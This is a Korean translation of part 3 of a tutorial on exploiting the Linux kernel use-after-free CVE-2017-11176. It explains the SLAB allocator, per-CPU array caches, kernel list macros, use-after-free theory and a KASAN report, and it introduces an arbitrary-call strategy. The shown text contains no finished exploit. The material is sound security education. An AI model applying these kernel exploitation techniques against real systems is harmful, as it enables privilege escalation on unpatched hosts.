---
layout: single
title:  "CVE-2017-11176: 한 걸음 한 걸음 리눅스 커널 익스플로잇하기 (part 3/4)"
date:   2019-08-12 15:36:33 +0900
classes: wide
categories: Security
---
*LEXFO의 [CVE-2017-11176: A step-by-step Linux Kernel exploitation (part 3/4)](https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html)를 번역한 문서입니다. 번역이 애매한 경우엔 원문의 단어를 옆에 적어두었습니다.*

## Introduction

[이전 파트](https://chamalane.herokuapp.com/posts/5d5035f8c040080004228196)에서 ([part 1](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca)에서 했던)System Tap의 커널 수정 없이 유저 영역의 코드만으로 버그를 트리거하는 *proof-of-concept* 코드를 만들었다.

이번 파트는 메모리 하위 시스템과 SLAB allocator 소개로 시작한다. 너무 큰 주제이기 때문에 **외부 자료를 참고하는 것을 강력히 추천한다**. 모든 종류의 use-after-free나 heap overflow 버그를 익스플로잇하기 위해선 꼭 이해해야 하는 개념이다.

use-after-free에 대한 기본적인 이론을 익스플로잇에 필요한 정보 수집 과정과 함께 설명할 것이다. 그리고 이 내용을 버그에 적용하여 우리의 특정한(particular) 버그에 사용 가능한 각기 다른 primitive들을 분석할 것이다. use-after-free를 arbitrary call primitive로 바꾸는 재할당 전략(reallocation strategy)을 제시할 것이다. 마지막엔 통제된 방식으로(in a controlled manner) 익스플로잇이 커널에 패닉을 불러일으킬 수 있을 것이다(무작위로 크래시되지 않는다).

여기서 나오는 테크닉은 보통 리눅스 커널에서 use-after-free를 익스플로잇할 때 사용하는 방법이다. 게다가 arbitrary call을 익스플로잇에 사용하기로 하였다. 하드코딩된 것들 때문에 익스플로잇은 *타겟이 없으면* 안 되고 kASLR(커널의 ASLR)을 우회할 수도 없다.

이 버그가 다른 primitive(= arbitrary read/write)를 얻고 kaslr/smap/smep을 우회하는([part 4](https://chamalane.herokuapp.com/posts/5d50360ac040080004228198)에서 smep을 우회한다) 여러 방법으로 익스플로잇 될 수 있다는 점에 주목하자. *proof-of-concept* 코드가 있는 지금이 익스플로잇 작성자로써 창의력을 발휘할 수 있는 순간이다.

게다가 커널 익스플로잇은 굉장히 복잡한(chaotic) 환경에서 실행된다. 이전 문서에선 그렇지 않았지만 이제부터 그렇다(재할당 참고). 즉 (race 상황에 놓여있었으므로) 익스플로잇이 실패한다면 대부분 그 이유 때문일 것이다. 믿을 만한 재할당은 *open field* 주제이며, 더 *복잡한* 트릭은 사용할 수 없다.

마지막으로 이제부터는 커널 데이터 구조 레이아웃이 중요하고, 디버깅을 위한 커널과 production 커널 사이에 차이가 존재하기 때문에 production 커널에서 사용할 수 없는 system tap과는 작별 인사를 하자. 이제 익스플로잇 디버깅을 하려면 system tap보다 클래식한 툴들을 사용해야 한다. 게다가 여기서 사용하는 구조 레이아웃과 제시된 커널의 구조 레이아웃이 다르므로 **여기서 제공되는 익스플로잇은 수정 없이는 제시된 시스템에서 돌아가지 않을 것이다**.

크래시가 (여러 번) 날 준비를 단단히 하고, 이제부터 재밌는 내용 시작이다.

- - -

## Table of Contents

* Core Concept #3
* Use-after-free 101
* Analyze the UAF (cache, allocation, free)
* Analyze the UAF (dangling pointers)
* Exploit (Reallocation)
* Exploit (Arbitrary call)
* Conclusion

- - -

## Core Concepts #3

세 번째 "핵심 개념" 섹션에선 메모리 하위 시스템("mm"이라고도 불림)을 소개한다. 너무 내용이 *방대해서* 이 내용만을 다루는 책이 있을 정도다. 여기서 다루는 내용만으론 충분하지 않기 때문에 다음 문서들을 읽어보는 걸 추천한다. 그럼에도 불구하고 리눅스 커널의 메모리 관리를 위해 사용되는 핵심 데이터 구조는 다루기 때문에 we can be on the same page (pun intended).

* Understanding the Linux Kernel (chapters 2,8,9)
* [Understanding The Linux Virtual Memory Manager](https://www.kernel.org/doc/gorman/pdf/understand.pdf)
* [Linux Device Driver: Allocating Memory](https://static.lwn.net/images/pdf/LDD3/ch08.pdf)
* [OSDev: Paging](https://wiki.osdev.org/Paging)

**최소한 "Understanding The Linux Virtual Memory Manager"의 [챕터 8](https://www.kernel.org/doc/gorman/html/understand/understand011.html)은 꼭 읽어보자**.

*핵심 개념* 섹션의 마지막엔 **container\_of()** 매크로를 소개하고 리눅스 커널에서 *이중 연결 원형 리스트*가 보통 어떻게 사용되는지 보여줄 것이다. **list\_for\_each\_entry\_safe()** 매크로를 이해하기 위한 기초적인 예시를 개발할 것이다(익스프로잇에 필요).

### Physical Page Management

어떤 운영체제든 메모리 관리는 가장 중요한 주제 중 하나다. 메모리 관리는 빨라야 하고, 안전(secure)해야 하고, 안정적(stable)이어야 하고, *단편화*(fragmentation)를 최소화해야 한다. 안타깝게도 대부분의 이런 목표는 orthogonal하다(보안이 종종 퍼포먼스의 저하를 불러일으킴). 효율을 위해 물리 메모리는 연속된 *고정된 길이의* 블록으로 나뉜다. 이 블록을 **페이지 프레임**이라 부르고 (일반적으로) 4096 바이트의 고정된 크기이다. 페이지의 크기는 *PAGE\_SIZE* 매크로를 통해 얻을 수 있다.

커널은 항상 메모리를 처리(handle)해야 하므로 모든 물리 페이지 프레임과 그에 대한 정보를 추적(keep track of)한다. 예를 들어 커널은 특정 페이지 프레임이 사용 가능한지 아닌지 알고 있어야 한다. 이런 정보는 **struct page** 구조체에 저장된다("Page Descriptor"라고도 불린다).

커널은 *alloc\_pages()*를 통해 연속적인 페이지들을 요청할 수 있고 *free\_pages()*를 통해 페이지들을 free시킬 수 있다. 이러한 요청을 처리하는 allocator는 *Zoned Page Frame Allocator*라 불린다. 이 allocator가 [buddy system algorithm](https://en.wikipedia.org/wiki/Buddy_memory_allocation)을 사용하므로 보통 **Buddy Allocator**라고 한다.

### Slab Allocators

buddy allocator가 제공하는 세분성(granularity)이 모든 상황에 맞지는 않다. 예를 들어 커널이 128 바이트의 메모리를 할당하고 싶은 경우에도 4096 바이트가 할당되어 3968 바이트의 메모리가 낭비된다. 이것을 [internal fragmentation](https://en.wikipedia.org/wiki/Fragmentation_(computing))이라 한다. 이 문제를 극복하기 위해 리눅스는 더 잘 세분화된 **Slab Allocator**를 도입했다. 간단하게 하기 위해 Slab Allocator가 커널에 대한 *malloc() / free()*의 동등성을 처리한다고 생각하자(?).

리눅스 커널은 세 가지 다른 Slab allocator를 제공하고, 이중 하나만 사용된다:

* SLAB allocator: 하드웨어 캐시 최적화에 초점을 둔 전통적인 allocator(데비안에서 여전히 사용)
* SLUB allocator: 2007년부터 표준 allocator로 선정된 "새" allocator(우분투/CentOS/안드로이드에서 사용)
* SLOB allocator: 메모리가 극히 적은 임베디드 시스템을 위해 만들어진 allocator

**노트**: 이름을 다음과 같이 구별하자: Slab은 하나의 Slab allocator이다(SLAB, SLUB, SLOB일 수 있다). SLAB(대문자)은 세 allocator 중 하나이다. slab(소문자)은 Slab allocator에서 사용되는 오브젝트이다.

여기서 모든 Slab allocator를 다룰 수 없다. 우리의 타겟은 자료가 많은 SLAB allocator를 사용한다. 지금은 SLUB allocator가 더 널리 쓰이는 것 같지만 관련 자료가 많지 않다. 물론 (우리가 생각하기에) 이해하기는 쉬운 편이다. "cache coloring"도 없고, "slab 전체"를 추적하지도 않고, 내/외부 slab 관리도 없는 등 이점이 있다. 타겟에 어떤 Slab이 사용되는지 알고 싶다면 config 파일을 읽어보면 된다:

```bash
$ grep "CONFIG_SL.B=" /boot/config-$(uname -r)
```

*재할당* 파트는 어떤 Slab allocator를 사용하느냐에 따라 달라진다. 복잡하게 들릴 수도 있지만 **SLAB에서 *use-after-free*를 익스플로잇하는 게 SLUB보다 더 쉽다**. 반면 SLUB를 익스플로잇할 때는 slab aliasing(= "일반적인" kmemcaches에 더 많은 오브젝트가 저장됨)이라는 장점이 있다.

### Cache and slab

커널이 계속 같은 크기의 오브젝트를 할당하려 하기 때문에 같은 메모리 영역의 페이지들을 요청/할당하는 것은 비효율적이다. 이를 방지하기 위해 Slab allocator에선 같은 크기의 오브젝트를 *캐시*(할당된 페이지 프레임들의 pool)에 저장한다. 캐시는 **struct kmem\_cache**("cache descriptor"라고도 불림)에 의해 describe된다:

```c
struct kmem_cache {
  // ...
    unsigned int        num;              // number of objects per slab
    unsigned int        gfporder;         // logarithm number of contiguous page frames in a slab
    const char          *name;            // name of the cache 
    int                 obj_size;         // object size in this cache
    struct kmem_list3   **nodelists;      // holds list of empty/partial/full slabs
    struct array_cache  *array[NR_CPUS];  // per-cpu cache
};
```

오브젝트 자체는 slab에 저장된다. 한 slab은 기본적으로 하나 혹은 여러 연속된 페이지 프레임이다. 예를 들어 한 페이지(4096 바이트)에 걸쳐 있는 slab은 1024 바이트의 오브젝트 넷을 hold할 수 있다.

한 slab의 상태(예: free한 오브젝트의 개수)는 **struct slab**("slab management structure"라고도 불림)에 저장된다:

```c
struct slab {
    struct list_head list;
    unsigned long colouroff;
    void *s_mem;                  // virtual address of the first object
    unsigned int inuse;           // number of "used" object in the slab
    kmem_bufctl_t free;           // the use/free status of each objects
    unsigned short nodeid;
};
```

slab 관리 구조체는 slab 자체(내부)에 저장될 수도, 다른 메모리 영역(외부)에 저장될 수도 있다. 이는 [external fragmentation](https://en.wikipedia.org/wiki/Fragmentation_(computing))을 줄이기 위함이다. slab 관리 구조체가 어디에 저장되는지는 캐시의 오브젝트 크기에 달려있다. 오브젝트 크기가 512 바이트보다 작다면 slab 내부에, 크다면 외부에 저장된다.

**노트**: 이 내부/외부 얘기에 대해선 크게 걱정하지 않아도 된다. 우린 *use-after-free*를 익스플로잇하고 있다. 하지만 만약 *heap overflow*를 익스플로잇한다면 이 내용을 꼭 이해해야 한다.

slab 안에 있는 오브젝트의 *가상 주소*는 **s\_mem** 필드와 오프셋을 조합하여 얻을 수 있다. 간단히 하기 위해 첫 오브젝트의 주소가 *s\_mem*, 두 번째 오브젝트의 주소가 *s\_mem* + *obj\_size*, 세 번째 오브젝트의 주소가 *s\_mem* + *2\*obj\_size*...와 같이 이어진다고 생각하자. 하드웨어 캐시 효율을 위해 사용되는 "coloring" 때문에 실제론 더 복잡하지만 주제를 벗어나는 내용이다.

### Slabs Housekeeping and Buddy interactions

새 slab가 생성되면 Slab allocator는 Buddy allocator에게 페이지 프레임을 요청한다. 반대로 slab이 소멸되면(destroyed), 가지고 있던 페이지를 Buddy에게 돌려준다.당연히 커널은 퍼포먼스를 위해 slab의 생성/소멸을 줄이려 한다. 

**노트**: 왜 *gfpordur (struct kmem\_cache)*가 "로그 수"(logarithm number)의 연속된 페이지 프레임인지 궁금할 수 있다.이유는 Buddy allocator가 바이트 크기로 작동하지 않고, 대신 2의 제곱수 "순서"(order)로 작동하기 때문이다. 즉 0번 순서(order of 0)는 한 페이지, 1번 순서는 두 개의 *연속적인* 페이지, 2번 순서는 네 개의 *연속적인* 페이지를 의미한다(?).

Slab allocator는 각각의 캐시에 대해 세 slab 이중 연결 리스트를 유지한다:

* full slabs: slab의 모든 오브젝트가 사용 중(= 할당됨)
* free slabs: slab의 모든 오브젝트가 free함(= slab이 비어있음)
* partial slabs: slab의 오브젝트 중 몇은 사용 중이고 몇은 free함

이 리스트들은 cache descriptor (*struct kmem\_cache*)의 **nodelists** 필드에 저장된다. 각각의 slab은 이 리스트 중 하나에 속한다. slab은 할당이나 free operation 도중에 다른 리스트로 옮겨질 수 있다(예: partial 리스트의 마지막 free한 오브젝트를 할당하는 경우, slab은 *full slabs 리스트*로 옮겨짐). 

Buddy allocator오의 상호작용을 줄이기 위해 **SLAB allocator는 여러 free/partial slab의 *pool*을 유지한다**. 오브젝트를 할당할 땐 이 리스트들에서 free한 오브젝트를 찾는다. 모든 slab이 꽉 차있으면 Slab은 Buddy에게 페이지를 더 요청하여 새로운 slab을 생성해야 한다. 이것은 *cache\_grow()* operation으로 알려져 있다. 반대로 Slab이 free한 slab을 "너무 많이" 가지고 있으면 몇 몇 slab을 소멸시켜 Buddy에게 페이지를 돌려준다.

### Per-CPU Array Cache

이전 섹션에서 Slab이 allocation 도중에 free 아니면 partial slabs 리스트를 *스캔해야* 한다는 것을 보았다. 리스트를 스캔하여 free한 자리를 얻는 것은 어떻게 보면 비효율적이다. 예를 들어 리스트에 접근하려면 locking이 필요하고 slab에서 오프셋을 찾아야 하는 등의 문제가 있다.

퍼포먼스를 *강화하기* 위해서 Slab은 free한 오브젝트에 대한 포인터 배열을 저장한다. 이 배열은 **struct array\_cache** 구조체이고 *struct kmem\_cache*의 **array** 필드에 저장된다.

```c
struct array_cache {
    unsigned int avail;       // number of pointers available AND index to the first free slot
    unsigned int limit;       // maximum number of pointers
    unsigned int batchcount;
    unsigned int touched;
    spinlock_t lock;
    void *entry[];            //  the actual pointers array
};
```

***array\_cache* 자체는 *후입선출(LIFO)* 구조(= 스택)로 사용된다.** 이는 익스플로잇을 하는 관점에서 *끝내주는* 속성이다! 이것이 바로 SLUB보다 SLAB에서 use-after-free를 익스플로잇하는 게 쉬운 주된 이유이다.

*제일 빠른* 코드 경로에서, 메모리 할당은 다음과 같이 간단하다:

```c
static inline void *____cache_alloc(struct kmem_cache *cachep, gfp_t flags) // yes... four "_"
{
    void *objp;
    struct array_cache *ac;

    ac = cpu_cache_get(cachep);

    if (likely(ac->avail)) {
        STATS_INC_ALLOCHIT(cachep);
        ac->touched = 1;
        objp = ac->entry[--ac->avail];        // <-----
  }

  // ... cut ...

  return objp;
}
```

동일한 방식으로 *가장 빠른* free 코드 경로는 다음과 같다:

```c
static inline void __cache_free(struct kmem_cache *cachep, void *objp)
{
    struct array_cache *ac = cpu_cache_get(cachep);

  // ... cut ...

    if (likely(ac->avail < ac->limit)) {
        STATS_INC_FREEHIT(cachep);
        ac->entry[ac->avail++] = objp;          // <-----
        return;
  }
}
```

다시 말해 할당/free operation은 최선의 경우 *O(1)*의 복잡도를 가진다.

**주의**: *제일 빠른* 경로가 실패하면 할당 알고리즘은 느린 방법(free/partial slab 리스트 스캔)이나 더 느린 방법(캐시 성장(grow))을 사용한다.

**cpu마다 하나의 array\_cache가 있다**는 점에 주목하자. 현재 구동 중인 cpu의 array 캐시는 **cpu\_cache\_get()**을 통해 얻을 수 있다. 그렇게 하면 (여느 cpu당 있는 변수와 같이) *locking* operation을 줄여 퍼포먼스를 늘릴 수 있다.

**주의: array cache에 있는 각각의 오브젝트 포인터는 각기 다른 slab에 속해있을 수 있다!**

### General Purpose and Dedicated Caches

커널은 *내부 단편화*를 줄이기 위해 2의 제곱수 개의 오브젝트 크기(32, 64, 128, ...)를 가진 캐시를 여럿 생성한다. 이렇게 함으로써 내부 단편화가 항상 50%보다 작게 된다. 커널이 특정 크기의 메모리를 할당할 땐 오브젝트가 들어갈 수 있는 제일 근접한 upper-boundded 캐시를 찾는다. 예를 들어 100 바이트를 할당하면 128 바이트의 캐시를 사용하게 된다.

SLAB에선 general purpose 캐시 이름 앞에 "size-"가 붙는다(예: "size-32", "size-64"). SLUB에선 앞에 "kmalloc-"이 붙는다(예: "kmalloc-32", ...). SLUB의 방식이 더 알아보기 좋아서 타겟이 SLAB를 사용한다 해도 SLUB의 방식대로 표기하겠다.

***general purpose* 캐시에서 메모리를 할당/해제하기 위해 커널은 *kmalloc()*과 *kfree()*를 사용한다.**

몇 몇 오브젝트가 자주 할당/해제되므로 커널은 몇 몇 특수한 "전용"(dedicated) 캐시를 생성한다. 예를 들어 *struct file* 오브젝트는 여러 곳에서 많이 쓰이기 때문에 전용 캐시(flip)를 가지고 있다. 이런 오브젝트를 위한 전용 캐시를 생성해주면 그런 캐시는 내부 단편화는 거의 발생하지 않는다.

***전용* 캐시에서 메모리를 할당/해제하기 위해 커널은 *kmem\_cache\_alloc()*과 *kmem\_cache\_free()*를 사용한다.

마지막엔 *kmalloc()*과 *kmem\_cache\_alloc()* 둘 다 **\_\_cache\_alloc()** 함수에 처한다(?/land). 마찬가지로 *free()*와 *kmem\_cache\_free()*는 **\_\_cache\_free()**에 처한다.

**노트**: **/proc/slabinfo**에서 캐시 전체 리스트와 자잘한 정보를 볼 수 있다.

### The container\_of() Macro

**container\_of()** 매크로는 리눅스 커널 전반에서 사용된다. 언제가 됐든 이해해야 한다. 코드를 보자:

```c
#define container_of(ptr, type, member) ({          \
    const typeof( ((type *)0)->member ) *__mptr = (ptr);    \
    (type *)( (char *)__mptr - offsetof(type,member) );})
```

*container\_of()* 매크로의 목적은 **속한 멤버 중 하나로부터 구조체의 주소를 얻는 것이다**. 두 매크로가 사용된다:

* [typeof()](https://gcc.gnu.org/onlinedocs/gcc/Typeof.html) - 컴파일 시의 타입을 정의
* [offsetof()](https://en.wikipedia.org/wiki/Offsetof) - 구조체 안 필드의 오프셋을 (바이트 단위로) 찾음

즉 현재 필드의 주소에서 "embedder" 구조체에서 가져온 오프셋을 뺀다. 구체적인 예시를 들어보겠다:

```c
struct foo {
  unsigned long a;
  unsigned long b;  // offset=8
}

void* get_foo_from_b(unsigned long *ptr)
{
  // "ptr" points to the "b" field of a "struct foo"
  return container_of(ptr, struct foo, b);
}

void bar() {
  struct foo f;
  void *ptr;

  printf("f=%p\n", &f);         // <----- print 0x0000aa00
  printf("&f->b=%p\n", &f->b);  // <----- print 0x0000aa08

  ptr = get_foo_from_b(&f->b);
  printf("ptr=%p\n", ptr);      // <----- print 0x0000aa00, the address of "f"
}
```

## Doubly-Linked Circular List Usage

이중 연결 원형 리스트는 리눅스 커널에서 광범위하게 사용된다. 일반적으로도 잘 이해하고 있어야 하고 여기서도 arbitrary call primitive에 도달하기 위해 알아야 한다. 구현 방식을 그냥 보기 보다는 간단한 예시를 만들어 어떻게 쓰이는지 보자. 이 섹션 마지막엔 ***list\_for\_each\_entry\_safe()* 매크로를 이해할** 수 있어야 한다.

**노트**: 간단히 하기 위해 "이중 연결 원형 리스트"를 그냥 "리스트"라고 하겠다.

리눅스는 리스트를 다루기 위해 구조체 하나를 사용한다:

```c
struct list_head {
    struct list_head *next, *prev;
};
```

이것은 다음과 같은 두 용도로 쓰일 수 있는 구조체다:

1. 리스트 자체(= "헤드")를 나타냄
2. 리스트 안의 요소를 나타냄

리스트는 **INIT\_LIST\_HEAD** 함수를 통해 초기화되며 *next*와 *prev*가 리스트 자신을 가리키게 한다.

```c
static inline void INIT_LIST_HEAD(struct list_head *list)
{
    list->next = list;
    list->prev = list;
}
```

가공의(fictional) *resource\_owner* 구조체를 정의해보자:

```c
struct resource_owner
{
  char name[16];
  struct list_head consumer_list;
};

void init_resource_owner(struct resource_owner *ro)
{
  strncpy(ro->name, "MYRESOURCE", 16);
  INIT_LIST_HEAD(&ro->consumer_list);
}
```

리스트를 사용하기 위해 리스트의 각각의 요소(예: 소비자)가 *struct\_head* 필드에 **내장되어야**(embed) 한다. 예를 들어보자:

```c
struct resource_consumer
{
  int id;
  struct list_head list_elt;    // <----- this is NOT a pointer
};
```

이 소비자는 각각 **list\_add()**와 **list\_del()** 함수를 통해 리스트에 추가/제거된다. 전형적인(typical) 코드는 다음과 같다:

```c
int add_consumer(struct resource_owner *ro, int id)
{
  struct resource_consumer *rc;

  if ((rc = kmalloc(sizeof(*rc), GFP_KERNEL)) == NULL)
    return -ENOMEM;

  rc->id = id;
  list_add(&rc->list_elt, &ro->consumer_list);

  return 0;
}
```

다음으로 우리는 소비자를 해제하고 싶지만 list entry에서 나온 포인터밖에 없다(나쁜 디자인이 의도됨). 구조체를 *container\_of()* 매크로를 사용하여 얻고, 요소를 리스트에서 제거하여 free시킨다:

```c
void release_consumer_by_entry(struct list_head *consumer_entry)
{
  struct resource_consumer *rc;

  // "consumer_entry" points to the "list_elt" field of a "struct resource_consumer"
  rc = container_of(consumer_entry, struct resource_consumer, list_elt);

  list_del(&rc->list_elt);
  kfree(rc);
}
```

그리고 *id*를 기반으로 자원 소비자를 가져오는 helper를 제공하고자 한다. **list\_for\_each()** 매크로로 리스트 전체를 훑어야 할 것이다:

```c
#define list_for_each(pos, head) \
    for (pos = (head)->next; pos != (head); pos = pos->next)

#define list_entry(ptr, type, member) \
    container_of(ptr, type, member)
```

볼 수 있듯이 *list\_for\_each()*가 *struct list\_head* 포인터(= iterator)만 주기 때문에 *container\_of()* 매크로를 사용해야 한다. 이 operation은 종종 **list\_entry()** 매크로로 대체된다(동일한 일을 하지만 *더 나은* 이름을 가지고 있음).

```c
struct resource_consumer* find_consumer_by_id(struct resource_owner *ro, int id)
{
  struct resource_consumer *rc = NULL;
  struct list_head *pos = NULL;

  list_for_each(pos, &ro->consumer_list) {
    rc = list_entry(pos, struct resource_consumer, list_elt);
    if (rc->id == id)
      return rc;
  }

  return NULL; // not found
}
```

*struct list\_head*를 선언해야 하고 *list\_entry()/container\_of()* 매크로를 사용하는 것은 가볍지 않은 작업이다. 이때문에 (*list\_first\_entry()*와 *list\_next\_entry()* 매크로를 사용하는) **list\_for\_each\_entry()** 매크로가 존재한다:

```c
#define list_first_entry(ptr, type, member) \
    list_entry((ptr)->next, type, member)

#define list_next_entry(pos, member) \
    list_entry((pos)->member.next, typeof(*(pos)), member)

#define list_for_each_entry(pos, head, member)              \
    for (pos = list_first_entry(head, typeof(*pos), member);    \
         &pos->member != (head);                    \
         pos = list_next_entry(pos, member))
```

방금 코드를 (*struct list\_head*를 선언하지 않고) 더 컴팩트하게 작성할 수 있다:

```c
struct resource_consumer* find_consumer_by_id(struct resource_owner *ro, int id)
{
  struct resource_consumer *rc = NULL;

  list_for_each_entry(rc, &ro->consumer_list, list_elt) {
    if (rc->id == id)
      return rc;
  }

  return NULL; // not found
}
```

다음으로 모든 소비자를 해제해주는 함수가 필요하다. 여기엔 두 가지 문제가 있다:

* 우리의 *release\_consumer\_by\_entry()* 함수는 좋지 못한 설계로 만들어졌고 인자에 *struct list\_head*를 인자로 받는다
* *list\_for\_each()* 매크로는 리스트가 **변하지 않는다**(immutable)고 생각한다.

즉 리스트를 순회하는 중엔 요소를 해제할 수 없고, 이것이 *use-after-free*로 이어질 수 있다(uaf는 어디에든 있다). 이를 해결하기 위해 **list\_for\_each\_safe()**가 만들어졌다. list\_for\_each\_safe()는 다음 요소를 "선 인출"(prefetch)한다:

```c
#define list_for_each_safe(pos, n, head) \
    for (pos = (head)->next, n = pos->next; pos != (head); \
        pos = n, n = pos->next)
```

이는 우리가 *struct list\_head*를 둘 선언해야 한다는 뜻이다:

```c
void release_all_consumers(struct resource_owner *ro)
{
  struct list_head *pos, *next;

  list_for_each_safe(pos, next, &ro->consumer_list) {
    release_consumer_by_entry(pos);
  }
}
```

마지막으로 *release\_consumer\_by\_entry()*가 별로였으므로 *struct resource\_consumer* 포인터를 인자로 사용하도록 재작성한다(container\_of()는 더이상 쓰이지 않음):

```c
void release_consumer(struct resource_consumer *rc)
{
  if (rc)
  {
    list_del(&rc->list_elt);
    kfree(rc);
  }
}
```

이제 *struct list\_head*가 인자로 들어가지 않으므로, **list\_for\_each\_entry\_safe()** 매크로를 이용하여 우리의 *release\_all\_consumers()* 함수를 재작성할 수 있다.

```c
#define list_for_each_entry_safe(pos, n, head, member)          \
    for (pos = list_first_entry(head, typeof(*pos), member),    \
        n = list_next_entry(pos, member);           \
         &pos->member != (head);                    \
         pos = n, n = list_next_entry(n, member))
```

즉 이렇게 된다:

```c
void release_all_consumers(struct resource_owner *ro)
{
  struct resource_consumer *rc, *next;

  list_for_each_entry_safe(rc, next, &ro->consumer_list, list_elt) {
    release_consumer(rc);
  }
}
```

좋다, 이제 코드에 *struct list\_head*가 들어가지 않는다.

**list\_for\_each\_entry\_safe()** 매크로를 이해했길 바란다. 이해가 가지 않았다면 이 섹션을 다시 읽자. 익스플로잇에서 *arbitrary call primitive*에 도달하기 위해선 **필수적으로** 이해해야 하는 내용이다. (오프셋 때문에) 어셈블리로도 이 내용을 다시 보게 될 것이다! 지금 이해하는 게 좋다.

- - -

## Use-after-free 101

이 섹션은 use-after-free의 기본적인 이론, 익스플로잇을 위해 필요한 것, 보편적인 익스플로잇 전략에 대해 다룬다.

### The Pattern

use-after-free와 같이 이름이 모든 것을 설명해주는 취약점이 드물다. *use-after-free*의 간단한 패턴은 다음과 같다:

```c
int *ptr = (int*) malloc(sizeof(int));
*ptr = 54;
free(ptr);
*ptr = 42; // <----- use-after-free
```

이게 버그가 되는 것은 *free(ptr)*을 호출한 후 (*ptr*이 가리리는) 메모리에 뭐가 있을지 모르기 때문이다. 이것을 **dangling pointer**라고 부른다. 읽기 혹은/그리고 쓰기 작업은 정의되지 않은 행동이다. 최선의 경우 그냥 *no-op*일 것이고, 최악의 경우 프로그램(이나 커널)의 크래시를 낸다.

### Information Gathering

커널에서 *use-after-free* 버그를 익스플로잇하는 것은 종종 같은 scheme을 따른다. 시도해보기 전에 다음 질문들에 답변할 수 있어야 한다:

1. allocator가 무엇인가? 어떻게 동작하는가?
2. 어떤 오브젝트를 다루는가?
3. *cache*가 어디 속하는가? 오브젝트 크기는 어떤가? 전용 캐시인가 일반 캐시인가?
4. 어디에 할당/해제되어 있는가?
5. 어디서 오브젝트가 free 후에 사용되고 있는가? 어떤 방식(읽기/쓰기)인가?

이 질문들에 답하기 위해서 구글에서 만든 훌륭한 리눅스 패치: [KASAN](https://www.kernel.org/doc/html/v4.14/dev-tools/kasan.html) (Kernel Address SANitizer)이 있다. 보통 다음과 같은 결과가 나온다:

```plaintext
================================================================== 
BUG: KASAN: use-after-free in debug_spin_unlock                             // <--- the "where"
kernel/locking/spinlock_debug.c:97 [inline] 
BUG: KASAN: use-after-free in do_raw_spin_unlock+0x2ea/0x320 
kernel/locking/spinlock_debug.c:134 
Read of size 4 at addr ffff88014158a564 by task kworker/1:1/5712            // <--- the "how"

CPU: 1 PID: 5712 Comm: kworker/1:1 Not tainted 4.11.0-rc3-next-20170324+ #1 
Hardware name: Google Google Compute Engine/Google Compute Engine, 
BIOS Google 01/01/2011 
Workqueue: events_power_efficient process_srcu 
Call Trace:                                                                 // <--- call trace that reach it
 __dump_stack lib/dump_stack.c:16 [inline] 
 dump_stack+0x2fb/0x40f lib/dump_stack.c:52 
 print_address_description+0x7f/0x260 mm/kasan/report.c:250 
 kasan_report_error mm/kasan/report.c:349 [inline] 
 kasan_report.part.3+0x21f/0x310 mm/kasan/report.c:372 
 kasan_report mm/kasan/report.c:392 [inline] 
 __asan_report_load4_noabort+0x29/0x30 mm/kasan/report.c:392 
 debug_spin_unlock kernel/locking/spinlock_debug.c:97 [inline] 
 do_raw_spin_unlock+0x2ea/0x320 kernel/locking/spinlock_debug.c:134 
 __raw_spin_unlock_irq include/linux/spinlock_api_smp.h:167 [inline] 
 _raw_spin_unlock_irq+0x22/0x70 kernel/locking/spinlock.c:199 
 spin_unlock_irq include/linux/spinlock.h:349 [inline] 
 srcu_reschedule+0x1a1/0x260 kernel/rcu/srcu.c:582 
 process_srcu+0x63c/0x11c0 kernel/rcu/srcu.c:600 
 process_one_work+0xac0/0x1b00 kernel/workqueue.c:2097 
 worker_thread+0x1b4/0x1300 kernel/workqueue.c:2231 
 kthread+0x36c/0x440 kernel/kthread.c:231 
 ret_from_fork+0x31/0x40 arch/x86/entry/entry_64.S:430 

Allocated by task 20961:                                                      // <--- where is it allocated
 save_stack_trace+0x16/0x20 arch/x86/kernel/stacktrace.c:59 
 save_stack+0x43/0xd0 mm/kasan/kasan.c:515 
 set_track mm/kasan/kasan.c:527 [inline] 
 kasan_kmalloc+0xaa/0xd0 mm/kasan/kasan.c:619 
 kmem_cache_alloc_trace+0x10b/0x670 mm/slab.c:3635 
 kmalloc include/linux/slab.h:492 [inline] 
 kzalloc include/linux/slab.h:665 [inline] 
 kvm_arch_alloc_vm include/linux/kvm_host.h:773 [inline] 
 kvm_create_vm arch/x86/kvm/../../../virt/kvm/kvm_main.c:610 [inline] 
 kvm_dev_ioctl_create_vm arch/x86/kvm/../../../virt/kvm/kvm_main.c:3161 [inline] 
 kvm_dev_ioctl+0x1bf/0x1460 arch/x86/kvm/../../../virt/kvm/kvm_main.c:3205 
 vfs_ioctl fs/ioctl.c:45 [inline] 
 do_vfs_ioctl+0x1bf/0x1780 fs/ioctl.c:685 
 SYSC_ioctl fs/ioctl.c:700 [inline] 
 SyS_ioctl+0x8f/0xc0 fs/ioctl.c:691 
 entry_SYSCALL_64_fastpath+0x1f/0xbe 

Freed by task 20960:                                                          // <--- where it has been freed
 save_stack_trace+0x16/0x20 arch/x86/kernel/stacktrace.c:59 
 save_stack+0x43/0xd0 mm/kasan/kasan.c:515 
 set_track mm/kasan/kasan.c:527 [inline] 
 kasan_slab_free+0x6e/0xc0 mm/kasan/kasan.c:592 
 __cache_free mm/slab.c:3511 [inline] 
 kfree+0xd3/0x250 mm/slab.c:3828 
 kvm_arch_free_vm include/linux/kvm_host.h:778 [inline] 
 kvm_destroy_vm arch/x86/kvm/../../../virt/kvm/kvm_main.c:732 [inline] 
 kvm_put_kvm+0x709/0x9a0 arch/x86/kvm/../../../virt/kvm/kvm_main.c:747 
 kvm_vm_release+0x42/0x50 arch/x86/kvm/../../../virt/kvm/kvm_main.c:758 
 __fput+0x332/0x800 fs/file_table.c:209 
 ____fput+0x15/0x20 fs/file_table.c:245 
 task_work_run+0x197/0x260 kernel/task_work.c:116 
 exit_task_work include/linux/task_work.h:21 [inline] 
 do_exit+0x1a53/0x27c0 kernel/exit.c:878 
 do_group_exit+0x149/0x420 kernel/exit.c:982 
 get_signal+0x7d8/0x1820 kernel/signal.c:2318 
 do_signal+0xd2/0x2190 arch/x86/kernel/signal.c:808 
 exit_to_usermode_loop+0x21c/0x2d0 arch/x86/entry/common.c:157 
 prepare_exit_to_usermode arch/x86/entry/common.c:194 [inline] 
 syscall_return_slowpath+0x4d3/0x570 arch/x86/entry/common.c:263 
 entry_SYSCALL_64_fastpath+0xbc/0xbe 

The buggy address belongs to the object at ffff880141581640 
 which belongs to the cache kmalloc-65536 of size 65536                         // <---- the object's cache
